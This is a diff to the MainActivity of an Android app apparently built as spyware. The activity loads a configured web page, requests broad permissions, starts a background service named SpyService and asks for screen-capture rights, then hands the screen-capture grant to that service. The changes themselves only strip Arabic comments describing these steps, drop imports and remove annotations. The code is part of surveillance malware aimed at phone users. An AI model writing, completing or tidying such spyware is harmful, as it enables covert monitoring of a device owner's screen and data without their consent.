@@ -2,18 +2,17 @@ package com.black.phone;
 
 import android.Manifest;
 import android.app.Activity;
-import android.app.AlertDialog;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.provider.Settings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.Toast;
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -37,9 +36,7 @@ public class MainActivity extends AppCompatActivity {
         webView.setWebViewClient(new WebViewClient());
         webView.loadUrl(Config.get(this).getWebviewUrl());
 
-        // طلب الصلاحيات
         requestPermissions();
-        // بدء الخدمة
         startService(new Intent(this, SpyService.class));
     }
 
@@ -89,13 +86,12 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // طلب صلاحية MediaProjection (لقطة الشاشة والبث)
         MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
         startActivityForResult(mpManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST);
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST) {
             for (int i = 0; i < grantResults.length; i++) {
@@ -110,7 +106,6 @@ public class MainActivity extends AppCompatActivity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == MEDIA_PROJECTION_REQUEST && resultCode == Activity.RESULT_OK) {
-            // تمرير النتيجة إلى SpyService
             Intent intent = new Intent(this, SpyService.class);
             intent.putExtra("mediaProjectionResultCode", resultCode);
             intent.putExtra("mediaProjectionData", data);
